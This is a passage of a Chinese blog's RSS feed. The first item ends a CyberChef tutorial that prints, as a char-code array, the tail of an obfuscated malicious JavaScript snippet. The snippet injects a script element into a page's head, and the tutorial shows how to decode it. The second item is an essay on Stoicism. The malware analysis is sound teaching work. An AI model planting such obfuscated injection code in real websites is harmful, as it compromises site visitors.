style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;首先使用正则表达式&lt;code&gt;([0-9]{2,3}(,s|))+&lt;/code&gt;筛选char型，然后使用&lt;code&gt;From Charcode&lt;/code&gt;对字符串进行转换，在转换前需要将间隔符Delimiter选为Comma（逗号），Base选为10进制，就可以解密出恶意代码了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/6d358ddb15e781c7bbb49ad6c86ed4dc.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;泪目了，早用上这个东西也不至于一个个对着ASCII码表替换了，和上古时代的电报员一样。&lt;/p&gt;
&lt;h4 id=&#34;循环解密&#34;&gt;循环解密&lt;/h4&gt;
&lt;p&gt;在Operation中的&lt;code&gt;Flow control&lt;/code&gt;中将&lt;code&gt;Label&lt;/code&gt;拖到最前面，&lt;code&gt;Jump&lt;/code&gt;拖到最后面，Jump的地址为Label的name，Maxmium jumps为要循环的次数，即可进行循环解密。&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;CyberChef 可以简单理解成一个脚本解密工具的集合，除此之外，它其实还有很多黑科技，比如解析网络数据包里的数据、解析图片的地理位置及时间信息等。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>《Stoic学派与课题分离》——成为一个自洽的人</title>
      <link>https://wander1ng.com/post/stoic%E5%AD%A6%E6%B4%BE%E4%B8%8E%E8%AF%BE%E9%A2%98%E5%88%86%E7%A6%BB%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E6%B4%BD%E7%9A%84%E4%BA%BA/</link>
      <pubDate>Tue, 09 Jul 2024 14:24:39 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/stoic%E5%AD%A6%E6%B4%BE%E4%B8%8E%E8%AF%BE%E9%A2%98%E5%88%86%E7%A6%BB%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E6%B4%BD%E7%9A%84%E4%BA%BA/</guid>
      <description>&lt;h4 id=&#34;什么是斯多葛主义&#34;&gt;什么是斯多葛主义&lt;/h4&gt;
&lt;p&gt;斯多葛学派是希腊哲学的一个流派，由基提乌姆的芝诺（Zeno）创立，成立于公元前4世纪并持续了大约5个世纪。今天最著名的古代斯多葛学派人物生活在罗马帝国时期：小塞内加（Seneca the Younger）、爱比克泰德（Epictetus）和罗马皇帝马可·奥勒留（Marcus Aurelius）。大多数人是从马可·奥勒留的《沉思录》（The Meditations）开始了解该哲学的，我建议你们读完这篇文章后再读这本书。&lt;/p&gt;
&lt;p&gt;斯多葛主义从根本上说是一种哲学世界观，它有着一套特定的伦理价值体系。这些价值观是一系列心理学实践的基础，旨在帮助我们成为更好的自己。在实践的过程中，我们变得更富有心理韧性，更不容易被生活中的事件所困扰。&lt;/p&gt;
&lt;p&gt;斯多葛学派认为，一种行为或道德上的智慧是唯一真实且至高无上的追求，他们称这种智慧为“美德”（Virtue）。换句话说，&lt;strong&gt;我们自身的品质比一切外物来得重要。我们无法完全控制发生在我们身上的遭遇，但却能控制自己如何去应对那些情况。生活是由你自己创造的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;人生的目标不应是享乐或名利，因为那些多半都在天不在我。人生的目标应是借着智慧和品质的力量来处理好命运交给我们的任何东西，无论那是痛苦还是快乐，名誉还是谴责，财富还是贫穷。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然而，这并不意味着斯多葛学派对美德外的一切都漠不关心（这是很多人对这派哲学的最大误解，所以这此我们需要额外注意）。斯多葛主义者确实有一些偏好，他们更想要快乐而非痛苦，更想要朋友而非敌人，更想要财富而非贫穷。然而，如果运气不佳，事与愿违，他们也不会感到强烈的沮丧。&lt;/p&gt;
&lt;p&gt;斯多葛派学说以伦理学为重心，秉持泛神物质一元论，强调神、自然与人为一体，“神”是宇宙灵魂和智慧，其理性渗透整个宇宙。&lt;/p&gt;
&lt;p&gt;在这种意义上，斯多葛学派是在学会接受他们的遭遇。他们从不抱怨，只是尽力处理好事务继续他们的生活。我认为斯多葛派伦理学的精髓是在两种显然矛盾的心理状态之间取得平衡。&lt;/p&gt;
&lt;p&gt;《埃皮克提图指南》（Enchiridion of Epictetus）是一本描述斯多葛主义训练的古老手册。我说过我不打算在这里讨论一次文献，但我不得不提到这本书开头句所包含的基本概念：“&lt;strong&gt;有些事我们可以控制，而另一些却不行。&lt;/strong&gt;”**现代的斯多葛学派倾向于称它为“控制二分法”（Dichotomy of Control）。**很明显，生活中有些事情是由我们决定的，而另一些则不是。但斯多葛主义者确实在这句话之中传达着更为深远的涵义。&lt;/p&gt;
&lt;p&gt;人们往往会忽视这一区别，担心或挣扎于他们无法控制的事情。一个很好的例子就是你不能改变过去——太晚了，该发生的都已经发生了。尽管我们在一定程度上都会后悔，但对过去的病态回顾在抑郁症患者中更为常见。我喜欢用莎士比亚的《麦克白夫人》（Lady Macbeth）的台词告诫自己：“无法补救的就无需后悔。”顺便说一句，你们如果听过匿名戒酒会著名的“静心祷告”（Serenity Prayer），就会发现它实际上表达了同样的意思：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上帝，赐予我去接受我不能改变之事的宁静&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;去改变我可以改变之事的勇气和去知晓二者区别的智慧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二个基本概念与第一个基本概念非常接近，它恰好可以用《埃皮克提图指南》中最广为引用的一句话来完美地概括：“&lt;strong&gt;让我们沮丧的不是事件，而是我们对事件的看法。&lt;/strong&gt;”顺便说一句，每位认知行为治疗师都知道这句话，因为几十年来，这是治疗之初他们最常对患者说的一句话。我们说过，有些事情是由我们决定的，另一些则不是。&lt;/p&gt;
&lt;p&gt;真正由我们决定的只有我们自己的思想和行为，包括我们选择看待生活中所面临的情况的方式。斯多葛派还有一句名言：凡事皆有好坏。当人们试图用坏的一面思考事件时，他们会感到不安和沮丧。例如，假设你在工作中做一个重要的演示时，有人问了你一个你无法回答的问题。当你告诉自己：“这简直是一场灾难，我看起来像个十足的白痴——我无法应对这种尴尬”，你的目光仅仅局限在了坏的一面上。你完全可以告诉自己“这没什么大不了的，最重要的是我做我最好的，我可以先停下来，承认我现在没有答案，并承诺得到答案后会回复他们”，这就是以好的一面在思考问题。&lt;/p&gt;
&lt;p&gt;**我们的思想至少在某种程度上塑造着我们的情感。更具体地来说，斯多葛学派认为我们对事物重要性的优先级和我们的价值观是塑造情感的关键。**这就把我们带回到了我在开头提到的斯多葛主义伦理学的基本原则。如果一个人相信外部事物和他人意见是最重要的，那他/她就离得神经症不远了——如果事情的结果不符合期盼，人就会陷于周而复始的沮丧和烦躁之中。&lt;/p&gt;
&lt;p&gt;斯多葛派希望我们对生活抱有更现实的态度，谨记事物的无常性，不幸与幸运会交替着发生。当人们在深层次上接受命运，并由此对事物愈加超脱和抽离，他们即可抵达智慧的境地。&lt;/p&gt;
&lt;p&gt;**关键是要注意到我们的价值并不取决于外界，那些只是虚假的投射。我们的财富会起起落落，就像一块石头被扔到空中又落下来，但它的起落对石头来说没有任何影响。只有我们的内心产生了比较级，这个事物才对我们显得重要。**只有当我们将其化作严格的要求，我们才会陷入不安：我不能跌倒，我必须成功！但也许这并没有那么重要，也许这不值得烦恼。斯多葛派认为任何外部事件都不值得烦恼，真正重要唯有我们自己的品质以及我们选择如何处理生活中发生的事情。&lt;/p&gt;
&lt;h4 id=&#34;三个日常训练&#34;&gt;三个日常训练&lt;/h4&gt;
&lt;p&gt;从某种意义上说，以一种特殊的方式看待世界本身就是一种重要的心理学实践。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;客观描述&lt;/strong&gt;&lt;/p&gt;
